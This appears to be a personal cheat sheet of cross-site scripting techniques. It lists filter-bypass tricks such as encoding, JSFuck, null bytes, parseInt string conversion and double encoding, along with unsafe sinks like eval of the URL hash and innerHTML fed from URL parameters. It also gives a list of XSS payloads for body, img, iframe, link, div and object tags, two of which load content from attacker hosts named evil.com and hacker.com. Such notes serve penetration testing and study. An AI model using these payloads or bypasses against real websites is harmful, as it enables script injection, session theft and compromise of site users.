*confirm==alert==prompt
*remember "esoteric javascript"(something related to encoding)
*the html entites which r sanitized(" to &#35..etc) will not word if it showed in html, it will only work if it is placed inside javascript like eventex(<img src="" onerror="(works here)(and only works here)"(not from here onwords bcz after qutos javascript ends(even that quots belongs to html))) 
*if our given input is used some where in javascript like(var a="hello "+input+"!") then we can alert bcz it is inside javascript. (?)
*remember about null byte
**if we cant bypass something but if our input is displayed in error then execute that xss
**remember jsFuck(this output strings to not alphanumeric charaters))
*spitet.innerHTML=new URL(location).searchParams.get('somebody'), this will parse somebody parameter from url and adds to innerHTML
*try to comment out things
*xss can be implemented in places like
*eval(location.hash.slice(1))(and then add #alert(1337) to the URL to make it work)@terjanq
*parseInt("alert", 30)this will convert alert string to 8680439, toString(30) this will convert back
*/ALERT(1337)/.source (if quots r not allowed this will become "ALERT(1337)")
*<script></script>
*javascript events
*urls javascript:alert(1)
*on body tag <body background="javascript:alert("XSS")">
*on img tag <img src="javascript:alert("XSS");">
*on iframe <iframe src="http://evil.com/xss.html">
*on input <input type="image" src="javascript:alert('XSS');">
*on link <link rel="stylesheet" href="javascript:alert('XSS');">
*on table <table background="javascript:alert('XSS')"> table==tb
*on div <div style="background-image: url(javascript:alert('XSS'))"> 
on div <div style="width: expression(alert('XSS'));">
*on object <object type="text/x-scriptlet" data="http://hacker.com/xss.html">
*double encode(url to html entity)(html entity to url)(and others)
